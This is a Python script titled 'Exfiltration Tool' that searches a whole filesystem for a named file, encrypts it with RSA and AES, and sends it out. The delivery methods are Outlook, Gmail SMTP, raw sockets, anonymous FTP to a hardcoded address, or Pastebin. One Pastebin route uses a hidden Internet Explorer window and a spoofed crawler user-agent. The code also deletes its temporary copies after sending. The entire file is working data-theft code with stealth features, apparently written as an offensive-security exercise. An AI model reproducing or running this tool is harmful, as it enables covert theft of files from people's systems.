from Cryptodome.Cipher import AES, PKCS1_OAEP
from Cryptodome.PublicKey import RSA 
from Cryptodome.Random import get_random_bytes
from io import BytesIO

import argparse
import base64
import ftplib
import getpass
import os
import random
import requests
import smtplib
import socket
import textwrap
import time
import zlib


def decrypt(encrypted_data):
    ''' Decrypts the payload and returns the plaintext.'''
    encrypted_bytes = BytesIO(base64.decodebytes(encrypted_data))
    RSA_cipher, keysize_in_bytes = get_RSA_cipher('pri')

    # Note the session key is derived from the key size of the private key.
    encrypted_session_key = encrypted_bytes.read(keysize_in_bytes)
    nonce       = encrypted_bytes.read(16)
    tag         = encrypted_bytes.read(16)
    ciphertext  = encrypted_bytes.read()

    # Decrypt the session key using the RSA key
    session_key = RSA_cipher.decrypt(encrypted_session_key)
    AES_cipher  = AES.new(session_key, AES.MODE_EAX, nonce)
    # Decrypt the message with AES cipher
    decrypted   = AES_cipher.decrypt_and_verify(ciphertext, tag)

    plaintext   = zlib.decompress(decrypted)
    return plaintext

def encrypt(plaintext):
    ''' Generates AES key and encrypts it with RSA. It returns the encrypted data.'''
    # Generate AES cipher
    session_key = get_random_bytes(16)
    AES_cipher  = AES.new(session_key, AES.MODE_EAX)

    # Compress plaintext and encrypt it with AES
    compressed_text = zlib.compress(plaintext)
    ciphertext, tag = AES_cipher.encrypt_and_digest(compressed_text)

    # Use RSA public key to encrypt AES session key.
    RSA_cipher, _  = get_RSA_cipher('pub')
    encrypted_session_key = RSA_cipher.encrypt(session_key)

    # The payload to decrypt will include: 
    msg_payload = encrypted_session_key + AES_cipher.nonce + tag + ciphertext

    # Base64 encode it 
    encrypted   = base64.encodebytes(msg_payload)
    return encrypted

def outlook(subject, contents):
    ''' Windows email sender. '''
    # Use WIN32COM to create an instance of the Outlook application
    outlook = win32com.client.Dispatch("Outlook.Application")
    message = outlook.CreateItem(0)
    message.DeleteAfterSubmit = True
    message.Subject = subject
    message.Body    = contents.decode()
    message.To      = tgt_accts[0]
    message.Send()

def plain_email(subject, contents):
    ''' Platform-independant email sender.'''
    message  = f'Subject: {subject}\nFrom {smtp_acct}\n'
    message += f'To: {tgt_accts}\n\n{contents.decode()}'
    server   = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()

    try:
        server.login(smtp_acct, smtp_password)
        # server.set_debuglevel(1)
        server.sendmail(smtp_acct, tgt_accts, message)
        time.sleep(1)
        print("[+] Email sent successfully! ")
        server.quit()
        
    except smtplib.SMTPAuthenticationError:
        print("[!] SMTP Authentication error, verify your username/password, hun.")
        server.quit()

def RSA_generate():
    ''' Generate public/private keys for the asymmetric RSA encryption and store them in your current folder.'''
    new_key     = RSA.generate(2048)
    private_key = new_key.exportKey()
    public_key  = new_key.publickey().exportKey()

    with open('key.pri', 'wb') as f:
        f.write(private_key)

    with open('key.pub', 'wb') as f:
        f.write(public_key)

def get_RSA_cipher(keytype):
    ''' Helper to grab either of the two RSA keys as needed. Returns the cipher object and the size of the key.'''
    with open(f'key.{keytype}') as f:
        key = f.read()
    rsakey  = RSA.importKey(key)
    # Returns an RSA cipher object and the size of the RSA key in bytes
    return (PKCS1_OAEP.new(rsakey), rsakey.size_in_bytes())

def find_docs(doc_type='.pdf'):                                                                
    ''' Walk entire filysystem to find files and returns its absolute path.'''
    if os.name == 'nt':
        for parent, _, filenames in os.walk('C:\\'):
            for filename in filenames:
                if filename.endswith(doc_type):
                    document_path = os.path.join(parent, filename)
                    yield document_path
    else:
        for parent, _, filenames in os.walk('/'):
            for filename in filenames:
                # if filename.endswith(doc_type):
                if filename == doc_type:
                    print(f"[+] Filename '{filename}' found!\n[+] Preparing exfiltration...")
                    document_path = os.path.join(parent, filename)
                    # return document_path
                    # print(document_path)
                    yield document_path
                    return
        print("[!] File not found :( Check for any typos, hun.")

def exfiltrate(document_path, method):
    ''' Grabs a file and exfiltrates it based on the method you provide.'''
    # File transfer: Read, encrypt and save in tmp/.
    if method in ['transmit', 'plain_ftp']:
        if os.name == 'nt':
            filename = f'C:\\Windows\\Temp\\{os.path.basename(document_path)}.duplicate'                      
            with open (document_path, 'rb') as f0:
                contents = f0.read()
            with open(filename, 'wb') as f1:
                f1.write(encrypt(contents))
            # Send the file and delete it immediately.
            EXFIL[method](filename)
            os.unlink(filename)
            print(f"[+] File '{filename}' was deleted from your system.")
        else:
            filename = f'/tmp/{os.path.basename(document_path)}.duplicate'
            with open (document_path, 'rb') as f0:
                contents = f0.read()
            with open(filename, 'wb') as f1:
                f1.write(encrypt(contents))
            # Send the file and delete it immediately.
            EXFIL[method](filename)
            os.unlink(filename)
            print(f"[+] File '{filename}' was deleted.")

    else:
        # print(document_path)
        # print(type(document_path))
        with open(document_path, 'rb') as f:
            contents = f.read()
        title = os.path.basename(document_path)
        contents = encrypt(contents)
        # print(title)
        # print(contents)
        EXFIL[method](title, contents)

def email_helper():
    global doc_type, tgt_accts, smtp_acct, smtp_password, smtp_server, smtp_port
    doc_type      = input("Enter the filename you want to encrypt and email: ")
    tgt_accts     = input('To: ')

    if os.name == 'nt':
        import win32com.client
        for fpath in find_docs(doc_type):
            exfiltrate(fpath, 'outlook')
    else:
        # Google's SMTP info
        smtp_server   = 'smtp.gmail.com'
        smtp_port     = 587
        smtp_acct     = input('From: ')
        smtp_password = getpass.getpass()
        for fpath in find_docs(doc_type): 
            exfiltrate(fpath, 'plain_email')

def file_helper():
    global doc_type, server
    doc_type = input("Enter the filename you want to encrypt and send via file transfer: ")

    for fpath in find_docs(doc_type):
        if os.name == 'nt':
            import win32file
            server = input("Enter the host you'd like to connect to: ")
            exfiltrate(fpath, 'transmit')
        else:
            ftp_server   = input("Enter FTP server IP: ")
            exfiltrate(fpath, 'plain_ftp')

def transmit(filepath, server='10.0.2.13'):
    '''Windows version'''
    client = socket.socket()
    # Open a port of our choosing
    try:
        client.connect((server, 10000))
    except socket.error:
        print("The connection was refused.")
        return
    
    with open(filepath, 'rb') as f:
        win32file.TransmitFile(
            client, win32file._get_osfhandle(f.fileno()), 0, 0, None, 0, b'', b'')
    
    print(f'\nFile {filepath} was sent successfully.')

def plain_ftp(filepath, ftp_server='10.0.2.13'):
    try:
        ftp = ftplib.FTP(ftp_server)
    except OSError:
        print("[!] Unable to connect to the server. Try to ping it or check if the service is running.") 
        return
    ftp.login("anonymous", "anon@example.com")
    ftp.cwd('/pub/')
    ftp.storbinary("STOR " + os.path.basename(filepath), open(filepath, "rb"), 1024)
    ftp.quit()
    print(f'\nFile {filepath} was sent successfully.')

def plain_paste(title, contents):
    login_url   = 'https://pastebin.com/api/api_login.php'
    login_data = {
        'api_dev_key':       api_dev_key,
        'api_user_name':     username,
        'api_user_password': password, 
    }
    r = requests.post(login_url, data=login_data, headers=header)
    api_user_key = r.text

    paste_url   = 'https://pastebin.com/api/api_post.php'
    paste_data = {
        'api_paste_name':    title,
        'api_paste_code':    contents.decode(),
        'api_dev_key':       api_dev_key,
        'api_user_key':      api_user_key,
        'api_option':       'paste',
        'api_paste_private': 0,
    }

    r = requests.post(paste_url, data=paste_data, headers=header)

    if (r.status_code == 200):
        print(f"[+] Data has been posted successfully: {r.text}")
    if (r.status_code == 422):
        print(f"[!] Authentication error: Please check your credentials, hun")

def wait_for_browser(browser):
    ''' Ensures the browser has finished its events and can be used.'''
    # Wait for browser to finish loading and its events have been completed.
    while browser.ReadyState != 4 and browser.ReadyState != 'complete':
        time.sleep(0.1)

def random_sleep():
    ''' Allows the browser to execute tasks that may have not been registered as events by the DOM.
        Makes the browser act as normal user behaviour.'''
    time.sleep(random.randint(5,10))

def login(ie):
    ''' Interacts with the DOM to find all HTML elements required to log in through Internet Explorer.'''
    full_doc = ie.Document.all
    for elem in full_doc:
        if elem.id == 'loginform-username':
            elem.setAttribute('value', username)
        elif elem.id == 'loginform-password':
            elem.setAttribute('value', password)
    
    random_sleep()
    if ie.Document.forms[0].id == 'w0':
        ie.Document.forms[0].submit()
    wait_for_browser(ie)

def submit(ie, title, contents):
    full_doc = ie.Document.all
    for elem in full_doc:
        if elem.id == 'postform-name':
            elem.setAttribute('value', title)
        elif elem.id == 'postform-text':
            elem.setAttribute('value', contents)
    
    if ie.document.forms[0].id == 'w0':
        ie.document.forms[0].submit()
    random_sleep()
    wait_for_browser(ie)

def ie_paste(title, contents):
    ''' Open an IE instnace, browse to Pastebin and submit your encrypted file.'''

    # Create a new instance of IE COM object
    ie = client.Dispatch('InternetExplorer.Application')
    # Do you want the process to be visible? Debugging = 1, Stealth = 0
    ie.Visible = 0

    ie.Navigate('https://pastebin.com/login', Headers=header)
    wait_for_browser(ie)
    login(ie)

    ie.Navigate('https://pastebin.com/')
    wait_for_browser(ie)
    submit(ie, title, contents.decode())

    ie.Quit()

def post_helper():
    global agent, header, doc_type, api_dev_key, username, password
    # Authentication
    username    = input("Enter your Pastebin username: ")
    password    = getpass.getpass(prompt='Enter your Pastebin password: ')
    # Yahoo web crawler
    agent    = 'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)' 
    header = {'User-Agent': agent}
    doc_type = input("Enter the filename you want to encrypt and post: ")
    
    if os.name == 'nt':
        from win32com import client
        for fpath in find_docs(doc_type):
            exfiltrate(fpath, 'ie_paste')
    else:
        api_dev_key = input("Enter your Pastebin API key: ")
        for fpath in find_docs(doc_type):
            exfiltrate(fpath, 'plain_paste')

# Dictionary dispatch to make the calling of the functions easy
EXFIL = {
    'outlook': outlook,
    'plain_email': plain_email,
    'plain_ftp': plain_ftp,
    'transmit': transmit,
    'ie_paste': ie_paste,
    'plain_paste': plain_paste,
}

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Exfiltration Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog = textwrap.dedent('''Example:
        $ python3 exfil.py -e --encrypt  # Type in some text, encrypt it and save it into a new file.
        $ python3 exfil.py -d --decrypt  # Read from a file and decrypt its contents in terminal.
        $ python3 exfil.py -m --mail     # Encrypt a file and send it out in an email.
        $ python3 exfil.py -f --file     # Encrypt a file and send it out via file transfer.
        $ python3 exfil.py -p --post     # Encrypt a file and post it in Pastebin.

            '''))
    parser.add_argument('-e', '--encrypt', action = 'store_true', help = 'Encrypt data and dump into a new file')
    parser.add_argument('-d', '--decrypt', action = 'store_true', help = 'Decrypt ciphertext from a file')
    parser.add_argument('-m', '--mail',    action = 'store_true', help = 'Encrypt a file and send it out in an email.')
    parser.add_argument('-f', '--file',    action = 'store_true', help = 'Encrypt a file and send it out via file transfer.')
    parser.add_argument('-p', '--post',    action = 'store_true', help = 'Encrypt a file and post it in Pastebin.')

    args = parser.parse_args()

    if (not os.path.isfile('key.pub')) and (not os.path.isfile('key.pri')):
        print("[!] It looks like you do not have an RSA key pair. Don't you worry child, I will generate a pair for ya.")
        RSA_generate()

    if args.encrypt:
        filename  = input("Enter the filename of your new ciphertext: ")
        plaintext = input("Enter the text you want to encrypt, hun: ").encode()
        with open(f'{filename}-encrypted.txt', 'wb') as f:
            f.write(encrypt(plaintext))
            print(f'\n[*] Data has been encrypted and saved here: ./{filename}-encrypted.txt') 
    
    if args.decrypt:
        file2decrypt = input("Enter the filename you want to decrypt: ")
        try:
            with open(file2decrypt, 'rb') as f:
                contents = f.read()
            print(decrypt(contents))
        except FileNotFoundError as e:
            print("[!] There is not a file with that name. Please check for typos.")

    if args.mail:
        email_helper()

    if args.file:
        file_helper()
    
    if args.post:
        post_helper()
    
    
